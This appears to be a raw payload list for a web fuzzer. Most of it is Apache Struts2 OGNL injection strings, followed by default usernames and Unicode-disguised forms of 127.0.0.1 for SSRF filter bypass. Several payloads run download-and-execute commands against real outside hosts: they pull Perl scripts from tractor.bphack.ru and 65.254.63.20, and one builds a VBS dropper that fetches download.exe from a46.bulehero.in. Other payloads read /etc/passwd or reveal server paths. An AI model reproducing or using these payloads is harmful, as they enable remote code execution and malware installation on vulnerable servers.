+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cd /tmp;wget tractor.bphack.ru/error2;perl error2;rm -rf error2').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://65.254.63.20/.jb | perl ; cd /tmp ; curl -O http://65.254.63.20/.jb ; fetch http://65.254.63.20/.jb ; perl .jb ;rm -rf .jb*').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-rSAh')).(#f=@java.io.File@createTempFile('SMLp','.exe')).(#f.setExecutable(true)).(#f.deleteOnExit()).(#fos=new java.io.FileOutputStream(#f)).(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data)).(#fos.write(#d)).(#fos.close()).(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).(#p.start()).(#f.delete())}
+%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd /c del C:/Windows/temp/appveif.vbs&echo Set Post = CreateObject("Msxml2.XMLHTTP") >>C:/Windows/temp/appveif.vbs&echo Set Shell = CreateObject("Wscript.Shell") >>C:/Windows/temp/appveif.vbs&echo Post.Open "GET","",0 >>C:/Windows/temp/appveif.vbs&echo Post.Send() >>C:/Windows/temp/appveif.vbs&echo Set aGet = CreateObject("ADODB.Stream") >>C:/Windows/temp/appveif.vbs&echo aGet.Mode = 3 >>C:/Windows/temp/appveif.vbs&echo aGet.Type = 1 >>C:/Windows/temp/appveif.vbs&echo aGet.Open() >>C:/Windows/temp/appveif.vbs&echo aGet.Write(Post.responseBody) >>C:/Windows/temp/appveif.vbs&echo aGet.SaveToFile "C:/Windows/temp/appveif.exe",2 >>C:/Windows/temp/appveif.vbs&echo wscript.sleep 10000>>C:/Windows/temp/appveif.vbs&echo Shell.Run ("C:/Windows/temp/appveif.exe")>>C:/Windows/temp/appveif.vbs&C:/Windows/temp/appveif.vbs').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd /c del C:/Windows/temp/appveif.vbs&echo Set Post = CreateObject("Msxml2.XMLHTTP") >>C:/Windows/temp/appveif.vbs&echo Set Shell = CreateObject("Wscript.Shell") >>C:/Windows/temp/appveif.vbs&echo Post.Open "GET","http://a46.bulehero.in/download.exe",0 >>C:/Windows/temp/appveif.vbs&echo Post.Send() >>C:/Windows/temp/appveif.vbs&echo Set aGet = CreateObject("ADODB.Stream") >>C:/Windows/temp/appveif.vbs&echo aGet.Mode = 3 >>C:/Windows/temp/appveif.vbs&echo aGet.Type = 1 >>C:/Windows/temp/appveif.vbs&echo aGet.Open() >>C:/Windows/temp/appveif.vbs&echo aGet.Write(Post.responseBody) >>C:/Windows/temp/appveif.vbs&echo aGet.SaveToFile "C:/Windows/temp/appveif.exe",2 >>C:/Windows/temp/appveif.vbs&echo wscript.sleep 10000>>C:/Windows/temp/appveif.vbs&echo Shell.Run ("C:/Windows/temp/appveif.exe")>>C:/Windows/temp/appveif.vbs&C:/Windows/temp/appveif.vbs').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo klss').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))')(d))&(i99)(('\43xman.getWriter().close()')(d))
+1%0d%0a1${(#x0='multipart/form-data').(#a1=14293212).(#a2=3009821).(#a3=#a1+#a2).(#a4='ttpServletResponse').(#a6='com.opensymph').(#a5='ony.xwork2.dispatcher.H').(#a7=#a6+#a5+#a4).(#a8='1n').(#a9='_ks3').(#a10=#a9+#a8).(#x1=#context[#a7].getWriter()).(#x1.print(#a3+#a10)).(#x1.close())}
+a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.println(%23req.getRealPath("/")),%23k8out.close())}
+class.classLoader.jarPath=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(#req.getRealPath("/")),#outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]
+debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1
+debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()
+%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action
+admin
+root
+Administrator
+guest
+user
+DEFAULT
+DEMO
+demo
+HELP
+127。0。0。1
+127｡0｡0｡1
+127．0．0．1
+⑫７｡⓪．𝟢。𝟷
+𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
+⁰𝔁𝟳𝙛𝟢０１
+２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
+𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
+𝟢₁𝟳₇｡０｡０｡𝟢𝟷
+𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
+[::𝟏②₇．𝟘．₀．𝟷]
+[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
+[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
+[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
+𝟎𝚇𝟕𝖋｡⓪｡𝟣
+𝟎ˣ𝟩𝘍｡𝟷
+𝟘𝟘①𝟕⑦．１
+⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
